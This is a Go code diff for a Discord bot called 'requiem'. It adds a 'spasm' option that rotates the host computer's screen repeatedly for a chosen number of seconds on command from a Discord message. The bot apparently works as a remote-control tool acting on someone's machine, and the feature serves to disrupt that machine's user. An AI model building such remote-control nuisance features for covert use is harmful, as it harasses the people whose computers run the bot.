@@ -3,6 +3,7 @@ package commands
 import (
 	"fmt"
 	"strings"
+	"time"
 
 	"requiem/funcs"
 	"requiem/utils"
@@ -12,6 +13,28 @@ import (
 
 func (*RotateCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
 	content := strings.Join(args, " ")
+
+	if utils.HasFlag(content, "spasm") {
+		timeout, found := utils.FindNumber(content)
+		if !found {
+			ses.ChannelMessageSendReply(msg.ChannelID, "🟥 You need to provde a number.", msg.Reference())
+			return
+		}
+
+		initial, _ := ses.ChannelMessageSendReply(msg.ChannelID, "Rotating screen...", msg.Reference())
+
+		until := time.Now().Add(time.Duration(timeout) * time.Second)
+		for i := 0; time.Now().Before(until); i = (i + 1) % 4 {
+			funcs.RotateScreen(uint32(i))
+			time.Sleep(500 * time.Millisecond)
+		}
+
+		funcs.RotateScreen(0)
+
+		ses.ChannelMessageDelete(msg.ChannelID, initial.ID)
+		ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully rotated screen.", msg.Reference())
+		return
+	}
 
 	var err error
 
